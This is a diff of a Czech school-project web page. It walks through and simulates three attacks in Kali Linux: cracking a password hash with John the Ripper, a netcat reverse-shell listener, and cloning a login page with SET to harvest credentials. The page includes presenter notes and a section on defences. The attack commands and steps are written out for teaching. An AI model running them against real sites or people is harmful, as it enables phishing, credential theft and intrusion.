-<span class="output-line">2</span> <span class="comment">(Site Cloner)</span>
-
-<span class="comment"># Nyní vás program vyzve k zadání IP adresy pro zachytávání. Zadejte lokální IP:</span>
-IP address for the POST back in Harvester/Tabnabbing: <span class="arg">127.0.0.1</span>
-
-<span class="comment"># Následně zadejte reálnou URL adresu, kterou chcete naklonovat (např. přihlášení):</span>
-Enter the url to clone: <span class="arg">http://testphp.vulnweb.com/login.php</span></pre>
-                    <button class="copy-btn" onclick="copyMe(this)">Kopírovat</button>
-                </div>
-            </div>
-            <p style="font-size:13px; color: var(--muted); margin-top:8px;">Program si danou stránku stáhne a spustí na tvém počítači falešný webový server. Na obrazovce bude svítit text: <code>Information will be displayed to you as it arrives below:</code></p>
-        </div>
-
-        <div id="ukazka3-krok2" class="card card-red">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--red); border-color:var(--red); background:rgba(248,113,113,0.1)">3. KROK 2</span>
-                <div>
-                    <h2>Pohled oběti a zachycení údajů</h2>
-                </div>
-            </div>
-            <p style="font-size:14px; margin-bottom: 12px;">Nyní otevři ve svém Kali Linuxu běžný webový prohlížeč (Firefox) a do URL řádku zadej adresu <strong><code>http://127.0.0.1</code></strong>.</p>
-            
-            <ul style="font-size:14px; color:var(--text); margin-bottom: 16px; padding-left: 20px;">
-                <li>Zobrazí se dokonalá kopie stránky, kterou jsi klonoval.</li>
-                <li>Zadej nějaké smyšlené jméno (např. <code>spoluzak</code>) a heslo (např. <code>skola123</code>).</li>
-                <li>Klikni na Login.</li>
-            </ul>
-
-            <div class="info-box danger">
-                <div class="info-box-label">🎯 PŘEPNI ZPĚT DO TERMINÁLU S BĚŽÍCÍM 'SET'</div>
-                Uvidíš tam červeně svítící výpis zachycených hodnot z formuláře, včetně: <br>
-                <code style="color: white; font-family: monospace;">POSSIBLE USERNAME FIELD FOUND: spoluzak</code><br>
-                <code style="color: white; font-family: monospace;">POSSIBLE PASSWORD FIELD FOUND: skola123</code>
-            </div>
-
-            <div class="speaker-box">
-                <div class="speaker-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg> Co říct spolužákům</div>
-                <p>"Vidíte, že operační systém i antivir celou dobu mlčely. Oběť normálně otevřela prohlížeč, sama vyplnila údaje a sama je odeslala. Operační systém nemůže chránit uživatele před ním samotným. Ukazuje se, že nejtěžší na nabourání systému často vůbec není hledání technické chyby v Linuxu nebo Windows, ale oklamání lidského mozku před klávesnicí."</p>
-            </div>
-        </div>
-
-        <!-- ========================================== -->
-        <!-- OBRANA A ZÁVĚR                             -->
-        <!-- ========================================== -->
-        <div class="section-divider" style="height: 1px; background: linear-gradient(to right, transparent, var(--border), transparent); margin: 40px 0;"></div>
-
-        <div id="obrana" class="card card-green">
-            <div class="section-header">
-                <span class="section-number" style="color:var(--green); border-color:var(--green); background:rgba(74,222,128,0.1)">ZÁVĚR</span>
-                <div>
-                    <h2>Jak se proti těmto útokům bránit?</h2>
-                    <p>Opatření pro administrátory operačních systémů i běžné uživatele</p>
-                </div>
-            </div>
-
-            <div style="display:flex; flex-direction:column; gap:16px;">
-                <div style="display:flex; gap:14px; padding-bottom:12px; border-bottom:1px solid rgba(39,126,165,0.08);">
-                    <div style="font-size:20px;">🔑</div>
-                    <div>
-                        <h4 style="font-size:14px; font-weight:600; color:#fff; margin-bottom:2px;">Obrana proti prolomení hesel</h4>
-                        <p style="font-size:13px; color:var(--muted);">Pro uživatele: Používat správce hesel (KeePass, Bitwarden) a dlouhá, neslovníková hesla. Pro systémy OS: Používat záměrně pomalé hashovací algoritmy jako <strong>Argon2</strong>, které znemožní masivní zkoušení přes John the Ripper.</p>
-                    </div>
+            <!-- Karta aktuálního kroku -->
+            <div class="bg-gray-900 border border-gray-800 rounded-xl p-6 flex-grow flex flex-col">
+                <div class="flex justify-between items-center mb-6 border-b border-gray-800 pb-4">
+                    <h3 id="step-title" class="text-xl font-bold text-white">Krok 1: Příprava</h3>
+                    <span id="step-counter" class="text-sm font-mono text-gray-500">1 / 3</span>
                 </div>
                 
-                <div style="display:flex; gap:14px; padding-bottom:12px; border-bottom:1px solid rgba(39,126,165,0.08);">
-                    <div style="font-size:20px;">🛡️</div>
-                    <div>
-                        <h4 style="font-size:14px; font-weight:600; color:#fff; margin-bottom:2px;">Obrana proti Reverse Shellu</h4>
-                        <p style="font-size:13px; color:var(--muted);">Pro administrátory OS: Běžný Firewall nestačí. Nasazují se <strong>EDR (Endpoint Detection and Response)</strong> systémy, které na úrovni jádra (Kernelu) OS analyzují, <em>jaký proces</em> se snaží spojit ven, a zastaví bash/powershell, pokud se chová podezřele.</p>
+                <p id="step-desc" class="text-gray-300 text-sm leading-relaxed mb-6 flex-grow">
+                    Zde bude popsáno, co se právě děje...
+                </p>
+
+                <!-- Tahák pro prezentujícího -->
+                <div class="bg-blue-900/20 border border-blue-500/20 rounded-lg p-4 mb-6">
+                    <div class="text-xs font-bold text-blue-400 uppercase tracking-wider mb-2 flex items-center gap-2">
+                        <span>🎙️</span> Co říct spolužákům:
                     </div>
+                    <p id="step-speaker" class="text-sm text-blue-200 italic">
+                        Tady bude tvůj text k odprezentování...
+                    </p>
                 </div>
-                
-                <div style="display:flex; gap:14px;">
-                    <div style="font-size:20px;">📱</div>
-                    <div>
-                        <h4 style="font-size:14px; font-weight:600; color:#fff; margin-bottom:2px;">Obrana proti Phishingu (Oklamání uživatele)</h4>
-                        <p style="font-size:13px; color:var(--muted);">Nejefektivnější obranou je plošné zavedení <strong>Dvoufaktorového ověřování (2FA/MFA)</strong> na úrovni organizace. I když uživatel odevzdá heslo útočníkovi (jak jsme viděli v SET), bez potvrzení na mobilním telefonu nebo USB tokenu (FIDO2) je heslo samotné k ničemu.</p>
+
+                <!-- Ovládací tlačítka -->
+                <div class="mt-auto">
+                    <button id="btn-run" onclick="runCurrentStep()" class="w-full py-4 bg-sky-500 hover:bg-sky-400 text-black font-bold rounded-lg transition text-lg flex justify-center items-center gap-2">
+                        ▶ Spustit simulaci příkazu
+                    </button>
+                    <button id="btn-next" onclick="nextStep()" class="hidden w-full py-4 bg-green-600 hover:bg-green-500 text-white font-bold rounded-lg transition text-lg flex justify-center items-center gap-2 shadow-[0_0_15px_rgba(74,222,128,0.2)]">
+                        Další krok ➔
+                    </button>
+                    <button id="btn-finish" onclick="goHome()" class="hidden w-full py-4 bg-gray-700 hover:bg-gray-600 text-white font-bold rounded-lg transition text-lg flex justify-center items-center gap-2">
+                        Dokončit ukázku
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Pravý panel: Terminál -->
+        <div class="w-full md:w-7/12 h-full py-2">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                    <span class="ml-3 text-xs text-gray-500 font-mono">kali@demo: ~</span>
+                </div>
+                <div class="terminal-body font-mono text-gray-300" id="terminal-content">
+                    <!-- Zde se bude generovat text terminálu -->
+                    <div id="term-lines"></div>
+                    <div id="term-active-line" class="hidden">
+                        <span class="text-green-400">kali@demo</span><span class="text-white">:</span><span class="text-sky-400">~</span><span class="text-white">$</span> 
+                        <span id="term-typing"></span><span class="cursor"></span>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- FOOTER -->
-        <div style="text-align:center; margin-top: 48px; padding-top: 32px; border-top: 1px solid var(--border);">
-            <div style="font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--muted);">Školní projekt · Kali Linux · Operační systémy</div>
-            <div style="font-size:12px; color:#3a5060; margin-top:6px;">Demostrace ofenzivních technik na lokálním prostředí.</div>
-        </div>
+    </main>
 
-    </div>
-</div>
-
-<script>
-    // Progress bar
-    window.addEventListener('scroll', () => {
-        const scrollTop = document.documentElement.scrollTop;
-        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
-        const pct = (scrollTop / docHeight) * 100;
-        document.getElementById('progress').style.width = pct + '%';
-    });
-
-    // Copy button
-    function copyMe(btn) {
-        const pre = btn.closest('.terminal-body').querySelector('pre');
-        const text = pre.innerText;
-        navigator.clipboard.writeText(text).then(() => {
-            btn.textContent = '✓ Zkopírováno';
-            btn.classList.add('copied');
-            setTimeout(() => {
-                btn.textContent = 'Kopírovat';
-                btn.classList.remove('copied');
-            }, 2000);
-        });
-    }
-
-    // Active nav highlight on scroll
-    const sections = document.querySelectorAll('[id]');
-    const navItems = document.querySelectorAll('.nav-item');
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(e => {
-            if (e.isIntersecting) {
-                navItems.forEach(n => {
-                    n.classList.toggle('active', n.getAttribute('href') === '#' + e.target.id);
-                });
+    <!-- Skripty (Logika simulátoru) -->
+    <script>
+        // Databáze scénářů
+        const scenarios = {
+            'hash': {
+                badge: 'ÚTOK 1 / OS',
+                color: 'sky',
+                title: 'Prolomení hesla (John the Ripper)',
+                steps: [
+                    {
+                        title: 'Krok 1: Extrakce hashe z OS',
+                        desc: 'Operační systémy neukládají hesla v textu, ale jako hash (nevratnou matematickou funkci). Prvním krokem útočníka je zisk tohoto hashe. My si ho teď nasimulujeme vygenerováním slabého hesla "tajneheslo".',
+                        speaker: 'Kdyby Linux ukládal hesla normálně a někdo se do něj naboural, měl by hned všechna hesla. Místo toho z nich dělá hash. My si teď nasimulujeme situaci, kdy útočník takový zahashovaný soubor z Linuxu ukradl.',
+                        cmd: 'echo "reditel:$(openssl passwd -6 -salt sul tajneheslo)" > shadow.txt\ncat shadow.txt',
+                        output: '<span class="text-white">reditel:</span><span class="text-gray-400">$6$sul$AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdefghijklmnopqrstuvwxyz0123456789AB</span>\n',
+                        delay: 800
+                    },
+                    {
+                        title: 'Krok 2: Slovníkový útok',
+                        desc: 'Nyní spustíme nástroj John the Ripper. Ten nebude zkoušet všechny kombinace písmen, ale využije obří slovník nejčastějších hesel. Bude je bleskově hashovat a porovnávat s naším ukradeným hashem.',
+                        speaker: 'Teď spustím John the Ripper. Ten neútočí přes internet – běží offline tady v mém počítači. Zkouší slova ze slovníku a protože oběť použila hloupé heslo "tajneheslo", systém ho rozlouskne prakticky okamžitě.',
+                        cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt',
+                        output: 'Using default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n<span class="text-yellow-400">... prolamuji (simulace) ...</span>\n<span class="text-green-400 font-bold">tajneheslo</span>       (reditel)\n1g 0:00:00:01 DONE (2026-09-19 17:33) 1.000g/s 3450p/s 3450c/s 3450C/s\nUse the "--show" option to display all of the cracked passwords reliably',
+                        delay: 2000
+                    }
+                ]
+            },
+            'shell': {
+                badge: 'ÚTOK 2 / SÍŤ',
+                color: 'yellow',
+                title: 'Obejití Firewallu (Reverse Shell)',
+                steps: [
+                    {
+                        title: 'Krok 1: Útočník naslouchá',
+                        desc: 'Útočník narazil na Firewall, který blokuje příchozí spojení. Zvolí tedy Reverse Shell. Ve svém Kali Linuxu si spustí nástroj Netcat, který bude čekat na to, až se oběť ozve jemu.',
+                        speaker: 'Představte si Firewall jako strážného, který nikoho cizího nepustí dovnitř. Útočník se tam tedy nedobývá. Místo toho si u sebe spustí program a čeká, až se oběť ozve jemu zevnitř.',
+                        cmd: 'nc -lvnp 4444',
+                        output: 'listening on [any] 4444 ...\n<span class="text-gray-500">⏳ Čekání na připojení oběti...</span>',
+                        delay: 1000
+                    },
+                    {
+                        title: 'Krok 2: Oběť spouští kód',
+                        desc: 'Oběť otevírá na svém PC infikovaný soubor (simulováno). Z jejího počítače se aktivně odešle systémový terminál směrem ven k útočníkovi. Firewall to povolí, protože to vypadá jako běžný odchozí webový provoz.',
+                        speaker: 'Oběť právě klikla na infikovanou přílohu. Systém nevydal žádný zvuk, ale na pozadí zavolal ven k nám. Firewall odchozí spojení nezablokoval. Vidíte ten výpis? Útočník právě dostal plný přístup do jejího počítače.',
+                        cmd: '/* Oběť spustila payload... Přijímám spojení */',
+                        output: 'connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58292\n<span class="text-green-400">C:\\Windows\\System32></span> whoami\ndesktop-obet\\uzivatel\n<span class="text-green-400">C:\\Windows\\System32></span> echo "Mám kontrolu nad systémem!"\n"Mám kontrolu nad systémem!"',
+                        delay: 2500
+                    }
+                ]
+            },
+            'phishing': {
+                badge: 'ÚTOK 3 / UŽIVATEL',
+                color: 'red',
+                title: 'Phishing a klonování webu (SET)',
+                steps: [
+                    {
+                        title: 'Krok 1: Klonování stránky',
+                        desc: 'Nejslabším článkem není OS, ale člověk. Pomocí Social-Engineer Toolkitu (SET) útočník naklonuje libovolnou přihlašovací stránku. Získá tak identickou kopii webu, která běží na jeho serveru.',
+                        speaker: 'Když je systém Windows plně zaktualizovaný, útočník na něj neútočí technicky. Zaútočí na uživatele. Teď v terminálu spustím automatický klonovač a vytvořím přesnou kopii školního portálu.',
+                        cmd: 'setoolkit\n> 1 (Social-Engineering Attacks)\n> 2 (Website Attack Vectors)\n> 3 (Credential Harvester)\n> 2 (Site Cloner)\n> URL: http://skolni-portal.cz/login',
+                        output: '[*] Cloning the website: http://skolni-portal.cz/login\n[*] This could take a little bit...\n<span class="text-green-400">[+] The best way to use this attack is if username and password form fields are available.</span>\n[*] Information will be displayed to you as it arrives below:\n',
+                        delay: 2000
+                    },
+                    {
+                        title: 'Krok 2: Zachycení údajů',
+                        desc: 'Útočník pošle oběti odkaz (např. v podvodném e-mailu). Oběť vidí známý web a zadá své údaje. Žádný antivir v OS nezareaguje, protože oběť údaje odevzdává naprosto dobrovolně v běžném prohlížeči.',
+                        speaker: 'Oběť klikla na odkaz, vidí před sebou známý web a zadává heslo. Operační systém nemůže uživatele chránit před jeho vlastní chybou. Podívejte se do našeho terminálu – údaje se nám právě objevily v čistém textu.',
+                        cmd: '/* Čekání na aktivitu oběti na falešném webu... */',
+                        output: '<span class="text-yellow-400">[*] WE GOT A HIT! Printing the output:</span>\n<span class="text-red-400">POSSIBLE USERNAME FIELD FOUND:</span> novak_jan\n<span class="text-red-400">POSSIBLE PASSWORD FIELD FOUND:</span> Skola2026!\n[*] Victim IP: 192.168.1.104',
+                        delay: 1500
+                    }
+                ]
             }
-        });
-    }, { rootMargin: '-20% 0px -70% 0px' });
-    sections.forEach(s => observer.observe(s));
-</script>
+        };
 
+        // Stav aplikace
+        let currentAppScenario = null;
+        let currentStepIndex = 0;
+        let isSimulating = false;
+
+        // Elementy
+        const viewHome = document.getElementById('view-home');
+        const viewSim = document.getElementById('view-simulator');
+        const btnBack = document.getElementById('btn-back');
+        const termLines = document.getElementById('term-lines');
+        const termActiveLine = document.getElementById('term-active-line');
+        const termTyping = document.getElementById('term-typing');
+        
+        // Funkce: Zpět na výběr
+        function goHome() {
+            viewSim.classList.add('hidden');
+            viewHome.classList.remove('hidden');
+            btnBack.classList.add('hidden');
+        }
+
+        // Funkce: Spuštění konkrétního scénáře
+        function startScenario(id) {
+            currentAppScenario = scenarios[id];
+            currentStepIndex = 0;
+            
+            // Nastavení hlavičky
+            document.getElementById('sim-badge').textContent = currentAppScenario.badge;
+            document.getElementById('sim-badge').className = `inline-block px-3 py-1 text-xs font-bold rounded-md bg-${currentAppScenario.color}-900/50 text-${currentAppScenario.color}-400 border border-${currentAppScenario.color}-500/30 mb-3`;
+            document.getElementById('sim-title').textContent = currentAppScenario.title;
+            
+            // Vymazání terminálu
+            termLines.innerHTML = '';
+            
+            // Přepnutí pohledu
+            viewHome.classList.add('hidden');
+            viewSim.classList.remove('hidden');
+            btnBack.classList.remove('hidden');
+
+            // Barva hlavního tlačítka
+            const btnRun = document.getElementById('btn-run');
+            btnRun.className = `w-full py-4 bg-${currentAppScenario.color}-500 hover:bg-${currentAppScenario.color}-400 text-black font-bold rounded-lg transition text-lg flex justify-center items-center gap-2`;
+
+            loadStep();
+        }
+
+        // Funkce: Načtení dat aktuálního kroku do UI
+        function loadStep() {
+            const stepData = currentAppScenario.steps[currentStepIndex];
+            
+            document.getElementById('step-counter').textContent = `${currentStepIndex + 1} / ${currentAppScenario.steps.length}`;
+            document.getElementById('step-title').textContent = stepData.title;
+            document.getElementById('step-desc').textContent = stepData.desc;
+            document.getElementById('step-speaker').textContent = stepData.speaker;
+            
+            document.getElementById('btn-run').classList.remove('hidden');
+            document.getElementById('btn-next').classList.add('hidden');
+            document.getElementById('btn-finish').classList.add('hidden');
+            
+            termActiveLine.classList.remove('hidden');
+            termTyping.textContent = '';
+        }
+
+        // Funkce: Spuštění simulace (Psaní kódu a výstup)
+        async function runCurrentStep() {
+            if (isSimulating) return;
+            isSimulating = true;
+            
+            document.getElementById('btn-run').classList.add('hidden');
+            const stepData = currentAppScenario.steps[currentStepIndex];
+            
+            // Animace psaní příkazu
+            const commands = stepData.cmd.split('\n');
+            
+            for (let i = 0; i < commands.length; i++) {
+                termTyping.textContent = '';
+                await typeText(commands[i], 30); // rychlost psaní
+                
+                // Přidání dopsaného řádku do historie
+                const cmdLine = document.createElement('div');
+                cmdLine.innerHTML = `<span class="text-green-400">kali@demo</span><span class="text-white">:</span><span class="text-sky-400">~</span><span class="text-white">$</span> <span class="text-white">${commands[i]}</span>`;
+                termLines.appendChild(cmdLine);
+            }
+            
+            termActiveLine.classList.add('hidden');
+
+            // Simulace prodlevy (zpracování)
+            await new Promise(r => setTimeout(r, stepData.delay));
+
+            // Zobrazení výstupu
+            if (stepData.output) {
+                const outputBlock = document.createElement('div');
+                outputBlock.className = "mb-4";
+                outputBlock.innerHTML = stepData.output.replace(/\n/g, '<br>');
+                termLines.appendChild(outputBlock);
+            }
+            
+            // Posun scrollbaru terminálu dolů
+            const terminalBody = document.querySelector('.terminal-body');
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+
+            isSimulating = false;
+
+            // Zobrazení tlačítka pro další krok nebo dokončení
+            if (currentStepIndex < currentAppScenario.steps.length - 1) {
+                document.getElementById('btn-next').classList.remove('hidden');
+            } else {
+                document.getElementById('btn-finish').classList.remove('hidden');
+            }
+        }
+
+        // Pomocná funkce pro animaci psaní
+        function typeText(text, speed) {
+            return new Promise(resolve => {
+                let i = 0;
+                function typeWriter() {
+                    if (i < text.length) {
+                        termTyping.textContent += text.charAt(i);
+                        i++;
+                        setTimeout(typeWriter, speed);
+                    } else {
+                        setTimeout(resolve, 300); // pauza po dopsání řádku
+                    }
+                }
+                typeWriter();
+            });
+        }
+
+        // Funkce: Další krok
+        function nextStep() {
+            currentStepIndex++;
+            loadStep();
+        }
+    </script>
 </body>
 </html>
